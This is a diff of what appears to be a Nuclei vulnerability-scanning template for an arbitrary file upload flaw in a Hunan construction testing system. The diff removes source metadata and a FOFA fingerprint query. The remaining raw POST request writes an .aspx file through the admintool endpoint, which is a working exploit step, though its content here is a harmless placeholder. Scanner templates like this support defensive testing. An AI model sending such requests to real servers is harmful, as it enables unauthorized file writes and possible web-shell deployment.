@@ -3,12 +3,8 @@ info:
   name: 湖南建研检测系统 admintool 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rerwub65lq93v1nw'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rerwub65lq93v1nw
-    fofa: body="/Content/Theme/Standard/webSite/login.css"
 http:
 - raw:
   - 'POST /Scripts/admintool?type=updatefile HTTP/1.1
@@ -27,8 +23,6 @@ http:
 
 
     Accept-Encoding: gzip, deflate, br
-
-
 
 
     filePath=dudesuite.aspx&fileContent=dudesuite
